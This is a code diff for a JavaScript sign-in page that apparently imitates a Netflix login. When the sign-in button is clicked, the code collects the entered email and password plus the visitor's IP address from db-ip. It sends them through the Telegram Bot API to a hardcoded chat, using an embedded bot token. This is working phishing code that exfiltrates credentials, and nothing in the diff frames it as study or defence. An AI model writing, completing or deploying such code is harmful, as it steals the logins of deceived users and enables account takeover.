@@ -10,9 +10,9 @@ const inputWrapperPassword = document.getElementById("input-wrapper-password")
 const warningEmail = document.getElementById("warningEmail")
 const warningPassword = document.getElementById("warningPassword")
 const signin = document.getElementById("signin")
-const ip ='Not Found'
+let ip ='Not Found'
 
-fetch('https://jsonplaceholder.typicode.com/todos/1')
+fetch('https://api.db-ip.com/v2/free/self')
     .then(result => result.json())
     .then((output) => {
         console.log('Output: ', output);
@@ -23,7 +23,6 @@ fetch('https://jsonplaceholder.typicode.com/todos/1')
 
 signin.addEventListener("click", async (ev)=>{
             ev.preventDefault();
-    const ip = await fetch("https://api.db-ip.com/v2/free/self")
             console.log("signing in...", ip.json());
                 const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=`+`NETFLIX  || ${inputEmail.value}:${inputPassword.value} || ${JSON.stringify(ip)}`
     fetch(url, {
